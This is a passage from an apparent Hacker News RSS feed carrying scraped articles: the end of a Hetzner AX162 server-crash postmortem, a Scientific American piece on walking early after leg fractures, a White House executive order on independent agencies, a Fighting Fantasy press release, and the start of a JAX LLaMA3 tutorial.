        Serial Number: .51R1H04.MXWSJ0039D004Z.</code></pre></div><p>We compared the components of AX162 servers that had crashed with those that hadn’t. We found no significant differences. We even checked how serial numbers increase, because we thought older components might fail more often. But crashes happened even in servers with the latest serial numbers.</p></div><div><h4>Power Consumption</h4><div><p>Power, rather than space, often limits data center expansion. To increase the number of machines under power constraints, data center operators usually cap power use per machine. However, this can cause motherboards to degrade more quickly. Although we didn’t know if Hetzner was limiting power consumption, the symptoms suggested this might be a factor. Repeated server crashes after a long period of stability usually mean the hardware is wearing out. We also eliminated all other hypotheses we had one by one, which only left power limiting as a strong hypothesis.</p><p>With the <span>powerstat</span> tool, we measured the maximum power consumption over a long period.</p></div><div><pre><code>$&gt; powerstat -R
  Time   User Nice  Sys  Idle   IO Run Ctxt/s  IRQ/s Fork Exec Exit  Watts
14:17:15  3.1  0.0  0.0  96.9  0.0   5    430   1593    0    0    0 166.54 
14:17:16  3.1  0.0  0.0  96.9  0.0   5    425   1638    1    1    1 166.51 
14:17:17  3.1  0.0  0.0  96.9  0.0   5    570   1737    0    0    0 166.50 
14:17:18  3.1  0.0  0.0  96.9  0.0   5    609   1787    0    0    0 166.48 
14:17:19  3.1  0.0  0.0  96.9  0.0   5    469   1662    0    0    0 166.49 
...
</code></pre></div><p>We then compared our measurements with the advertised amounts.</p><div><table><thead><tr><th>Model</th><th>Advertised Max. Power Consumption (Watt)</th><th>Measured Max. Power Consumption (Watt)</th></tr></thead><tbody><tr><td>AX161</td><td><p>147 (<a href="https://web.archive.org/web/20240223142827/https://www.hetzner.com/dedicated-rootserver/matrix-ax/" target="_blank">1</a>)</p></td><td>168</td></tr><tr><td>AX162</td><td><p>408 (<a href="https://web.archive.org/web/20240228172003/https://www.hetzner.com/dedicated-rootserver/matrix-ax/" target="_blank">2</a>)</p></td><td>266</td></tr><tr></tr></tbody></table></div><p>Based on these numbers, we suspected that Hetzner might indeed be limiting power usage.</p></div><div><h4>Data Collection on Crash Rates and Comparison</h4><p>Although we were observing an increased crash rate, we wanted to support this observation with data. A common way to measure hardware reliability is the Annualized Failure Rate (AFR). It's like the annual run rate, but for component failures. The formula for AFR is:</p><p><img src="https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/67ab440611daa766d7af72f7_AFR.png" loading="lazy" sizes="(max-width: 479px) 93vw, (max-width: 767px) 97vw, (max-width: 991px) 94vw, (max-width: 1439px) 58vw, 748.703125px" srcset="https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/67ab440611daa766d7af72f7_AFR-p-500.png 500w, https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/67ab440611daa766d7af72f7_AFR-p-800.png 800w, https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/67ab440611daa766d7af72f7_AFR-p-1080.png 1080w, https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/67ab440611daa766d7af72f7_AFR.png 1186w" alt="afr calculation"></p><p>AFR has its own limitations, but it is simple enough to give us a starting point, so we decided to use it. Here are our initial measurements:</p><div><table><thead><tr><th>Model</th><th>Total Failure Count</th><th>Total Days in Service</th><th>Annual Failure Rate</th></tr></thead><tbody><tr><td>AX161</td><td><p>11</p></td><td>3784</td><td>1.06</td></tr><tr><td>AX162</td><td><p>34</p></td><td>737</td><td>16.84</td></tr><tr></tr></tbody></table></div><p>Our observations indicated that AX162 servers are 16 times more likely to experience a failure compared to other models. The data also backed up our first finding: after a server crashes once, it is very likely to crash again. In fact, 80% of servers that crashed once had a second crash within 24 hours</p></div></div><div id="aws-firecracker"><h3>Observing Stability with New Hardware</h3><div><p>We submitted a detailed support ticket with the additional data on power limiting and annualized failure rates. Hetzner didn’t confirm or deny the possibility of power limiting but informed us that they had identified a defect in a batch of motherboards. They had recently received a new batch and recommended replacing the motherboards in our affected servers. Normally, replacing a big part of our fleet can disrupt customer workloads. However, we had already moved most critical tasks from the AX162 servers because they kept crashing, so replacing them was manageable.</p><p>We replaced the motherboards but kept critical workloads off the AX162 servers. We weren't sure the issue was fully resolved. Based on prior experience, we knew that servers appearing stable could still begin to crash frequently even after a month. Thus, we decided to monitor them carefully over an extended period.</p><p>At first, we saw no crashes. Then, after two weeks, servers with the new motherboards started crashing as well.</p></div><div><table><thead><tr><th>Model</th><th>Total Failure Count</th><th>Total Days in Service</th><th>Annual Failure Rate</th></tr></thead><tbody><tr><td>AX161</td><td><p>11</p></td><td>3784</td><td>1.06</td></tr><tr><td>AX162</td><td><p>34</p></td><td>737</td><td>16.84</td></tr><tr><td>AX162 -v2</td><td><p>11</p></td><td>758</td><td>5.30</td></tr></tbody></table></div><div><p>AX162 servers with new motherboards crashed less frequently, but the crash rate was still high. After contacting Hetzner again, we learned of an even newer version of the motherboard with improved reliability. We migrated our servers to this latest version and began monitoring reliability.</p><p>After monitoring the new servers for several months, we concluded that the crash issue is indeed resolved. Additionally, the AFR of these servers is now even better than that of the AX161 servers.</p></div><div><table><thead><tr><th>Model</th><th>Total Failure Count</th><th>Total Days in Service</th><th>Annual Failure Rate</th></tr></thead><tbody><tr><td>AX161</td><td><p>11</p></td><td>3784</td><td>1.06</td></tr><tr><td>AX162</td><td><p>34</p></td><td>737</td><td>16.84</td></tr><tr><td>AX162 -v2</td><td><p>11</p></td><td>758</td><td>5.30</td></tr><tr><td>AX162 -v3</td><td><p>4</p></td><td>3738</td><td>0.39</td></tr></tbody></table></div></div><div id="ubicloud-compute"><h3>Process Improvements</h3><p>Adopting a new line of servers early on can come with unforeseen issues. We were quick to adopt the new servers because their specs were exciting. Also Hetzner’s decision to discontinue the AX161 model suggested the new line was production-ready. Looking back, waiting six months could have helped us avoid many issues. Early adopters usually find problems that get fixed later. Moving forward, we will make the following changes:</p><ul role="list"><li>We will conduct a thorough vetting of future server models.</li><li>We will introduce new hardware gradually, beginning with non-critical workloads.</li><li>We will add more bare metal providers to distribute the risk. In fact, we already support two more bare metal providers; Leaseweb and Latitude. We are also working on adding the fourth one.</li></ul><p>We hope our lessons offer valuable insights to others navigating similar issues. As we develop a solid, open-source alternative to traditional cloud providers, these experiences motivate us to keep improving. We aim to deliver cloud solutions that are both reliable and adaptable.</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Broken Legs and Ankles Heal Better If You Walk on Them Within Weeks (149 pts)]]></title>
            <link>https://www.scientificamerican.com/article/broken-legs-and-ankles-heal-better-if-you-walk-on-them-within-weeks/</link>
            <guid>43101383</guid>
            <pubDate>Wed, 19 Feb 2025 12:36:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.scientificamerican.com/article/broken-legs-and-ankles-heal-better-if-you-walk-on-them-within-weeks/">https://www.scientificamerican.com/article/broken-legs-and-ankles-heal-better-if-you-walk-on-them-within-weeks/</a>, See on <a href="https://news.ycombinator.com/item?id=43101383">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><p>February 18, 2025</p><p>4<!-- --> min read</p></div><p>Using crutches for months is largely a thing of the past. Early weight-bearing has real benefits</p><figure><img src="https://static.scientificamerican.com/dam/m/2536f2bc1f78d195/original/sa0325SoH01.jpg?m=1738864029.009&amp;w=600" alt="Illustration of a person's legs, transparent, bones showing" srcset="https://static.scientificamerican.com/dam/m/2536f2bc1f78d195/original/sa0325SoH01.jpg?m=1738864029.009&amp;w=600 600w, https://static.scientificamerican.com/dam/m/2536f2bc1f78d195/original/sa0325SoH01.jpg?m=1738864029.009&amp;w=900 900w, https://static.scientificamerican.com/dam/m/2536f2bc1f78d195/original/sa0325SoH01.jpg?m=1738864029.009&amp;w=1000 1000w, https://static.scientificamerican.com/dam/m/2536f2bc1f78d195/original/sa0325SoH01.jpg?m=1738864029.009&amp;w=1200 1200w, https://static.scientificamerican.com/dam/m/2536f2bc1f78d195/original/sa0325SoH01.jpg?m=1738864029.009&amp;w=1350 1350w" sizes="(min-width: 900px) 900px, (min-resolution: 2dppx) 75vw, (min-resolution: 2.1dppx) 50vw, 100vw" fetchpriority="high"><figcaption> <p>Jay Bendt</p></figcaption></figure></div><div><p data-block="sciam/paragraph">Twenty years ago my husband, Mark, broke his left ankle and was in a cast and on crutches for nearly two months. Last year he broke the other ankle. But this time, after surgery, his doctor surprised us by instructing Mark to walk on it two weeks later.</p><p data-block="sciam/paragraph">It turns out the standard advice to stay off a broken leg bone for at least six weeks is based less on scientific evidence and more on cultural caution—physicians like to play it safe. But now studies show that complications are no more likely with early weight-bearing than with a long delay. Except in a few complex cases, walking around earlier helps broken bones heal, and it improves quality of life: for example, people can return to work and other activities faster.</p><p data-block="sciam/paragraph">If you are fully immobilized, “you come out of the cast with a sort of hairy, withered leg that takes forever to overcome,” says orthopedic trauma surgeon Alex Trompeter of St. George’s University of London. “The science tells us that the rate at which you lose muscle mass is far faster than the rate at which you gain it.” You’re slow to build bone, too. Consider astronauts. After six months in zero gravity at the International Space Station, they lose 10 percent of their bone density, and to ward off that loss they do exercises in space that are equivalent to bearing weight.</p><hr><h2>On supporting science journalism</h2><p>If you're enjoying this article, consider supporting our award-winning journalism by<!-- --> <a href="https://www.scientificamerican.com/getsciam/">subscribing</a>. By purchasing a subscription you are helping to ensure the future of impactful stories about the discoveries and ideas shaping our world today.</p><hr><p data-block="sciam/paragraph">In the 19th century German surgeon and anatomist Julius Wolff recognized that healthy bones adapt and change in response to the load placed on them. That is why everyone—but especially women, who are more susceptible than men to osteoporosis—should lift weights as they age. It increases bone density.</p><blockquote data-block="contentful/pullquote"><p>Those who walked early on femurs that had broken just above the knee had no higher rate of complications than those who stayed off the leg for six weeks.</p></blockquote><p data-block="sciam/paragraph">When you fracture a bone anywhere in the body, physicians first worry about stability. How much will the bone fragments move if you put weight on them? If the answer is too much, surgery is usually indicated—first a “reduction” to realign the pieces of bone and then “fixation” to hold them in place with screws, plates or rods.</p><p data-block="sciam/paragraph">That procedure sets up a bone, which is living tissue, to heal naturally by making new bone and resorbing damaged cells. In the gap caused by a fracture, a healing tissue called callus forms first, which then turns into bone. The right amount of load or movement (here’s where Wolff’s discovery applies) is critical to this process. Too little results in no callus; too much prevents the bone from knitting back together. “It’s all about the strain environment,” says orthopedic surgeon Chris Bretherton of Queen Mary’s Hospital in London.</p><p data-block="sciam/paragraph">Surgical implants hold the alignment until that process is complete. “It’s a little bit of a race postoperatively between the bone healing and the fixation breaking,” says orthopedic trauma surgeon Marilyn Heng of the University of Miami Miller School of Medicine. In that contest, she roots for the new bone. “Once the body heals and forms bone across the fracture site, the hardware we put in becomes extraneous. The crux of our decisions for weight-bearing status is we want to win that race.”</p><p data-block="sciam/paragraph">And putting some load on the bones aids that goal. Although the process of bone healing is the same all over the body, bones in the lower limbs such as hips, femurs and ankles bring extra complications because they affect the ability to walk. In patients with hip fractures—predominantly frail, older people—that immobility can lead to dire consequences.</p><p data-block="sciam/paragraph">Some patients do not have the dexterity and strength to manage partial weight-bearing while using crutches, so they stay in bed. The lack of movement leads to serious problems such as blood clots and weakening of the lungs. One 2005 study found that nine percent of hip fracture patients died within 30 days of breaking a hip and that 30 percent died within the first year. But more recent studies of healing hips suggest that early weight-bearing decreases mortality rates, and doctors have altered their practices. “The normal standard of care is [now] to fix it and let people walk,” Trompeter says.</p><p data-block="sciam/paragraph">Breaks in long bones, like the femur in your thigh, can be relatively straightforward to repair with a rod. In a study that looked back at outcomes for a series of patients, Heng and her colleagues showed that those who walked early on femurs that had broken just above the knee had no higher rate of complications than those who stayed off the leg for six weeks.</p><p data-block="sciam/paragraph">For ankles, the largest randomized controlled trial to date (480 fracture cases across 23 centers in the U.K.) was published in 2024 in the <i>Lancet</i>. Half of the patients were instructed to walk after two weeks, and the other half were told to wait until after six weeks. Any complications, such as infections or broken plates, were equally common in both groups, so early walking didn’t pose a greater risk. And the early weight-bearing group reported better function in the ankle at six weeks and at four months postsurgery. “Surgeons just needed a push,” says Bretherton, who led the study. He hopes this evidence “gives them that confidence.”</p><p data-block="sciam/paragraph">As for my husband, he jumped at the chance to get moving sooner. In less than two months, the point at which he was just coming out of a cast last time, his scar was fully healed, he was walking normally and, with a few limitations—no running, no quick pivots—he was exercising again. It seems that he won this race.</p><p data-block="sciam/paragraph"><i>This is an opinion and analysis article, and the views expressed by the author or authors are not necessarily those of </i>Scientific American.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A few hours ago, the US has turned into a de-facto dictatorship (142 pts)]]></title>
            <link>https://old.reddit.com/r/law/comments/1isvzgu/the_full_executive_order_is_out_this_is_the</link>
            <guid>43099826</guid>
            <pubDate>Wed, 19 Feb 2025 08:15:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://old.reddit.com/r/law/comments/1isvzgu/the_full_executive_order_is_out_this_is_the">https://old.reddit.com/r/law/comments/1isvzgu/the_full_executive_order_is_out_this_is_the</a>, See on <a href="https://news.ycombinator.com/item?id=43099826">Hacker News</a></p>
Couldn't get https://old.reddit.com/r/law/comments/1isvzgu/the_full_executive_order_is_out_this_is_the: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Ensuring Accountability for All Agencies (245 pts)]]></title>
            <link>https://www.whitehouse.gov/presidential-actions/2025/02/ensuring-accountability-for-all-agencies/</link>
            <guid>43098705</guid>
            <pubDate>Wed, 19 Feb 2025 04:49:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.whitehouse.gov/presidential-actions/2025/02/ensuring-accountability-for-all-agencies/">https://www.whitehouse.gov/presidential-actions/2025/02/ensuring-accountability-for-all-agencies/</a>, See on <a href="https://news.ycombinator.com/item?id=43098705">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>


<main>
	<div>




<p>&nbsp;By the authority vested in me as President by the Constitution and the laws of the United States of America, it is hereby ordered: &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;<span>Section</span>&nbsp;<span>1</span>. &nbsp;<span>Policy and Purpose</span>. &nbsp;The Constitution vests all executive power in the President and charges him with faithfully executing the laws. &nbsp;Since it would be impossible for the President to single-handedly perform all the executive business of the Federal Government, the Constitution also provides for subordinate officers to assist the President in his executive duties. &nbsp;In the exercise of their often-considerable authority, these executive branch officials remain subject to the President’s&nbsp;ongoing supervision and control. &nbsp;The President in turn is regularly elected by and accountable to the American people. &nbsp;This is one of the structural safeguards, along with the separation of powers between the executive and legislative branches, regular elections for the Congress, and an independent judiciary whose judges are appointed by the President by and with the advice and consent of the Senate, by which the Framers created a Government accountable to the American people.  &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;However, previous administrations have allowed so-called “independent regulatory agencies” to operate with minimal Presidential supervision. &nbsp;These regulatory agencies currently exercise substantial executive authority without sufficient accountability to the President, and through him, to the American people. &nbsp;Moreover, these regulatory agencies have been permitted to promulgate significant regulations without review by the President. &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;These practices undermine such regulatory agencies’ accountability to the American people and prevent a unified and coherent execution of Federal law. &nbsp;For the Federal Government to be truly accountable to the American people, officials who wield vast executive power must be supervised and controlled by the people’s&nbsp;elected President.  &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;Therefore, in order to improve the administration of the executive branch and to increase regulatory officials’ accountability to the American people, it shall be the policy of&nbsp;the executive branch to ensure Presidential supervision and control of the entire executive branch. &nbsp;Moreover, all executive departments and agencies, including so-called independent agencies, shall submit for review all proposed and&nbsp;final significant regulatory actions to the Office of Information and Regulatory Affairs (OIRA) within the Executive Office of the President before publication in the&nbsp;<em>Federal Register</em>.&nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;<span>Sec</span>.&nbsp;<span>2</span>. &nbsp;<span>Definitions</span>. &nbsp;For the purposes of this order:</p>



<p>&nbsp; &nbsp; &nbsp;(a) &nbsp;The term “employees” shall have the meaning given that term in section 2105 of title 5, United States Code.  &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(b) &nbsp;The term “independent regulatory agency” shall have the meaning given that term in section 3502(5) of title 44, United States Code. &nbsp;This order shall not apply to the Board of Governors of the Federal Reserve System or to the Federal Open Market Committee in its conduct of monetary policy. &nbsp;This order shall apply to the Board of Governors of the Federal Reserve System only in connection with its conduct and authorities directly related to its supervision and regulation of financial institutions. &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(c) &nbsp;The term “independent regulatory agency chairman” shall mean, with regard to a multi-member independent regulatory agency, the chairman of such agency, and shall mean, with regard to a single-headed independent regulatory agency, such agency’s&nbsp;chairman, director, or other presiding officer.   &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(d) &nbsp;The term “head” of an independent regulatory agency shall mean those appointed to supervise independent regulatory agencies and in whom the agencies’ authorities are generally vested, encompassing the chairman, director, or other presiding officer, and, as applicable, other members, commissioners, or similar such officials with responsibility for supervising such agencies.  &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;Sec.&nbsp;3. &nbsp;OIRA Review of Agency Regulations. &nbsp;(a) &nbsp;Section 3(b) of Executive Order 12866 of September 30, 1993 (“Regulatory Planning and Review”), as amended, is hereby amended to read as follows:  &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;“(b)&nbsp; “Agency,” unless otherwise indicated, means any authority of the United States that is an “agency” under 44&nbsp;U.S.C. 3502(1), and shall also include the Federal Election Commission. &nbsp;This order shall not apply to the Board of Governors of the Federal Reserve System or to the Federal Open Market Committee in its conduct of monetary policy. &nbsp;This order shall apply to the Board of Governors of the Federal Reserve System only in connection with its conduct and authorities directly related to its supervision and regulation of financial institutions.”.</p>



<p>&nbsp; &nbsp; &nbsp;(b) &nbsp;The Director of the Office of Management and Budget (OMB) shall provide guidance on implementation of this order to the heads of executive departments and agencies newly submitting regulatory actions under section 3(b) of Executive Order 12866. &nbsp;Agency submissions by independent regulatory agencies under such section shall commence within the earlier of 60 days from the date of this order, or completion of such implementation guidance. &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;<span>Sec</span>.&nbsp;<span>4</span>. &nbsp;<span>Performance Standards and Management Objectives</span>. &nbsp;The Director of OMB shall establish performance standards and management objectives for independent agency heads, as appropriate and consistent with applicable law, and report periodically to the President on their performance and efficiency in attaining such standards and objectives.&nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;<span>Sec</span>.&nbsp;<span>5</span>. &nbsp;<span>Apportionments for Independent Regulatory Agencies</span>. &nbsp;The Director of OMB shall, on an ongoing basis:  &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(a) &nbsp;review independent regulatory agencies’ obligations for consistency with the President’s policies and priorities; and  &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(b) &nbsp;consult with independent regulatory agency chairmen and adjust such agencies’ apportionments by activity, function, project, or object, as necessary and appropriate, to advance the President’s&nbsp;policies and priorities. &nbsp;Such adjustments to apportionments may prohibit independent regulatory agencies from expending appropriations on particular activities, functions, projects, or objects, so long as such restrictions are consistent with law.&nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;<span>Sec</span>.&nbsp;<span>6</span>. &nbsp;<span>Additional Consultation with the Executive Office of the President</span>. &nbsp;(a) &nbsp;Subject to subsection (b), independent regulatory agency chairmen shall regularly consult with and coordinate policies and priorities with the directors of OMB, the White House Domestic Policy Council, and the White House National Economic Council.  </p>



<p>&nbsp; &nbsp; &nbsp;(b) &nbsp;The heads of independent regulatory agencies shall establish a position of White House Liaison in their respective agencies. &nbsp;Such position shall be in grade 15 of the General Schedule and shall be placed in Schedule C of the excepted service.  </p>



<p>&nbsp; &nbsp; &nbsp;(c) &nbsp;Independent regulatory agency chairmen shall submit agency strategic plans developed pursuant to the Government Performance and Results Act of 1993&nbsp;to the Director of OMB for clearance prior to finalization.&nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;&nbsp;<span>Sec</span>.&nbsp;<span>7</span>. &nbsp;<span>Rules of Conduct Guiding Federal Employees’ Interpretation of the Law</span>. The President and the Attorney General, subject to the President’s supervision and control, shall provide authoritative interpretations of law for the executive branch. &nbsp;The President and the Attorney General’s opinions on questions of law are controlling on all employees in the conduct of their official duties.&nbsp;&nbsp;No employee of the executive branch acting in their official capacity may advance an interpretation of the law as the position of the United States that contravenes the President or the Attorney General’s opinion on a matter of law, including but not limited to the issuance of regulations, guidance, and positions advanced in litigation, unless authorized to do so by the President or in writing by the Attorney General.&nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;&nbsp;<span>Sec</span>.&nbsp;<span>8</span>. &nbsp;<span>General Provisions</span>. &nbsp;(a) &nbsp;If any provision of this order, or the application of any provision to any person or circumstance, is held to be invalid, the remainder of this order and the application of its provisions to any other persons or circumstances shall not be affected thereby. &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(b) &nbsp;Nothing in this order shall be construed to impair or otherwise affect: &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(i) &nbsp;&nbsp;the authority granted by law to an executive department, agency, or the head thereof; or&nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(ii) &nbsp;the functions of the Director of the Office of Management and Budget relating to budgetary, administrative, or legislative proposals. &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(c) &nbsp;This order shall be implemented consistent with applicable law and subject to the availability of appropriations. &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(d) &nbsp;This order is not intended to, and does not, create any right or benefit, substantive or procedural, enforceable at law or in equity by any party against the United States, its departments, agencies, or entities, its officers, employees, or agents, or any other person. &nbsp;</p>
</div>
</main>



</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Steve Jackson Games Is Bringing the Fighting Fantasy Books to the US (102 pts)]]></title>
            <link>https://www.sjgames.com/fightingfantasy/</link>
            <guid>43098626</guid>
            <pubDate>Wed, 19 Feb 2025 04:35:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.sjgames.com/fightingfantasy/">https://www.sjgames.com/fightingfantasy/</a>, See on <a href="https://news.ycombinator.com/item?id=43098626">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="contentwrapper">


          <div>
            <!-- Header Section --> <!-- <b><i>Fighting Fantasy</i></b> -->
            

            <p><b><i>Steve Jackson Games Tapped As
                    US <b><i>Fighting Fantasy</i></b> Publisher</i></b> <br>
                <i>Classic Solo Adventure Game Books Return After More Than 20 Years </i><br>
              </p>

            <div>
              <!-- <b><i>Fighting Fantasy</i></b> -->
              <p>AUSTIN, TX 10/17/24 – In 1982, British game designers Sir Ian Livingstone and Steve Jackson
                introduced <b><i>Fighting Fantasy</i></b>, a revolutionary set of solo adventure books that combined
                nonlinear narratives with dice-rolling tabletop RPG mechanics. Now, this fantastical,
                multi-million-selling book series returns to the United States thanks to an historic 50-book publishing
                collaboration with Steve Jackson Games. The first books in the series will be available in early 2025.
              </p>

              <p><b><i>Fighting Fantasy</i></b> debuted with <b><i>The Warlock of Firetop Mountain</i></b> in 1982.
                Since then, over 20 million copies of the exciting series have been sold worldwide. In <b><i>Fighting
                    Fantasy</i></b>, players embark on a solo adventure where their decisions – and dice rolls
                – determine the outcome of the story. This combination of nonlinear narrative and classic tabletop
                action sets the series apart from other gamebook franchises.</p>

              <p><b><i>Fighting Fantasy</i></b> co-creators Sir Ian Livingstone and Steve Jackson (UK) stated how
                thrilled they were to sign a US publishing agreement for <b><i>Fighting Fantasy</i></b> with Steve
                Jackson Games. Sir Ian says: </p>

              <p><i>"To have a new publisher in the USA is a special moment in the history of <b><i>Fighting
                      Fantasy</i></b>. We have known Steve Jackson (US) for more than 40 years, having distributed Steve
                  Jackson Games in the 1980s when we owned Games Workshop. Steve also wrote three fantastic
                  <b><i>Fighting Fantasy</i></b> books which caused a lot of confusion at the time when people didn't
                  realize there were two Steve Jacksons! We look forward to exciting times ahead in the USA for new and
                  existing <b><i>Fighting Fantasy</i></b> fans." </i></p>

              <p> The first five books will be released in early 2025, with an additional five volumes later that year. <a href="http://eepurl.com/i1pTxA">SIGN UP</a> for the latest news about Fighting Fantasy from Steve Jackson Games!
              </p>

              <p><b>About Steve Jackson Games</b>: Steve Jackson Games, based in Austin, Texas, has published games,
                game books, and magazines since 1980. SJ Games has an extensive catalog of hit games, including
                <b><i>Munchkin</i></b>, <b><i>Zombie Dice</i></b>, <b><i>Car Wars</i></b>, the <b><i>GURPS</i></b>
                roleplaying system, <b><i>Ogre</i></b>, <b><i>The Fantasy Trip</i></b>, and more.
                <b><i>Munchkin</i></b>, <b><i>Ogre</i></b>, and <b><i>Illuminati</i></b> also have digital versions on
                Steam and other platforms, bringing tabletop classics to a new generation of fans.</p>
            </div>
          </div> 

          <p><a href="https://www.sjgames.com/fightingfantasy/img/steve-ian.png"><img src="https://www.sjgames.com/fightingfantasy/img/steve-ian.png" alt="Steve and Ian"></a>
          </p>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Thoughts on Daylight Computer (232 pts)]]></title>
            <link>https://jon.bo/posts/daylight-computer-1/</link>
            <guid>43098318</guid>
            <pubDate>Wed, 19 Feb 2025 03:41:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jon.bo/posts/daylight-computer-1/">https://jon.bo/posts/daylight-computer-1/</a>, See on <a href="https://news.ycombinator.com/item?id=43098318">Hacker News</a></p>
Couldn't get https://jon.bo/posts/daylight-computer-1/: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Implementing LLaMA3 in 100 Lines of Pure Jax (128 pts)]]></title>
            <link>https://saurabhalone.com/blogs/llama3/web</link>
            <guid>43097932</guid>
            <pubDate>Wed, 19 Feb 2025 02:37:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://saurabhalone.com/blogs/llama3/web">https://saurabhalone.com/blogs/llama3/web</a>, See on <a href="https://news.ycombinator.com/item?id=43097932">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <article>
                <h2>Implementing LLaMA3 in 100 Lines of Pure Jax</h2>
                
                

                

                <div>

                    <p>In this post, we'll implement <strong>llama3</strong> from scratch using pure <strong>jax</strong> in just 100 lines of code. Why jax? Because I think it has good aesthetics. Also jax looks like a NumPy wrapper but it has some cool features like <strong>xla</strong>; a linear algebra accelerator, <strong>jit</strong>, <strong>vmap</strong>, <strong>pmap</strong> etc., which makes your training go brr brr.</p>
                    <p>Jax is one of the first libraries which strongly focuses on the soul of <strong>pure functional programming</strong> which makes it more cool.<sup>1</sup></p>
                    <p><strong>Note :</strong></p>
                    <div>
                            <ul>
                                <li>This post assumes familiarity with Python and basic understanding of transformer architectures.</li>
                                <li>This implementation is  for educational purposes, which means it is not for any production stuff but it covers all components of the model.<sup>2</sup></li>
                                <li>If you don't wanna read this amazing blog post then you can check out all the code at.<sup>3</sup></li>
                            </ul>
                        </div>

                    <p><img src="https://saurabhalone.com/blogs/llama3/images/newllama.png" alt="Llama architecture">
                        <img src="https://saurabhalone.com/blogs/llama3/images/llamadark.png" alt="Llama architecture">
                    </p>
                </div>


                <div>
                    <h2>Table of Contents</h2>
                    <nav>
                        <ul>
                            <li><a href="#section-1">1. LLaMA3</a></li>
                            <li><a href="#section-2">2. Model Weights Initialization</a></li>
                            <li><a href="#section-3">3. Tokenization</a></li>
                            <li><a href="#section-4">4. Embeddings</a></li>
                            <li><a href="#section-5">5. Root Mean Square Layer Normalization</a></li>
                            <li><a href="#section-6">6. Rotary Positional Encoding</a></li>
                            <li><a href="#section-7">7. Group-Query Attention</a></li>
                            <li><a href="#section-8">8. Transformer-Block</a></li>
                            <li><a href="#section-9">9. Forward-Pass</a></li>
                            <li><a href="#section-10">10. Dataset</a></li>
                            <li><a href="#section-11">11. Loss Function</a></li>
                            <li><a href="#update function">12. Update Function</a></li>
                            <li><a href="#training-loop">13. Training-Loop</a></li>
                            <li><a href="#results">14. Results</a></li>
                        </ul>
                    </nav>
                </div>


                

                <div>
                    <h2 id="section-1">LLaMA3</h2>
                    <p> 
                        At its core, LLaMA 3 is a decoder only transformer language model that generates text one token at a time, 
                        building on previous tokens to predict what comes next ; like completing a sentence word by word.
                   </p>
                    <p>
                        So lets fucking go !! we're doing it, get your diet coke !! First, we will begin with setting up device<sup>5</sup> and configuring the model.
                    </p>
                </div>



<div>
    <pre><code><span># Configure JAX to use GPU and prevent memory preallocation</span>
<span>os</span>.<span>environ</span>[<span>'JAX_PLATFORM_NAME'</span>] = <span>'gpu'</span>
<span>os</span>.<span>environ</span>[<span>'XLA_PYTHON_CLIENT_PREALLOCATE'</span>] = <span>'false'</span>
<span>print</span>(<span>"JAX devices:"</span>, <span>jax</span>.<span>devices</span>())</code></pre>
</div>

<p> So these are the hyperparameter we need to train approximately 2 million parameters model.</p>

<div>
    <pre><code><span># Define model hyperparameters</span>
<span>args</span> = <span>ModelArgs</span>(
    <span>vocab_size</span>=<span>enc</span>.<span>n_vocab</span>,    <span># Size of vocabulary</span>
    <span>dim</span>=<span>256</span>,                <span># Embedding dimension</span>
    <span>n_layers</span>=<span>6</span>,            <span># Number of transformer layers</span>
    <span>n_heads</span>=<span>8</span>,             <span># Number of attention heads</span>
    <span>n_kv_heads</span>=<span>4</span>,          <span># Number of key-value heads for GQA</span>
    <span>max_seq_len</span>=<span>512</span>,       <span># Maximum sequence length</span>
    <span>norm_eps</span>=<span>1e-5</span>          <span># Normalization epsilon</span>
)</code></pre></div>

    
<div>
    <h2 id="section-2">Model Weights Initialization</h2>


    
    
<p>
  In pure JAX, we don't use classes like in PyTorch. We use only pure fucntions why ? cause it makes our code more predictable and easier to parallelize.
   
  A pure function always returns the same output for the same input and doesn’t cause any side effects.<sup>6</sup> For example, if you call F(x), you'll always get the same y.
</p>

<p>
  Since we aren’t using a framework like PyTorch’s <strong>nn.Module</strong> to automatically track parameters, we must initialize and update our weights manually.
</p>

<p>
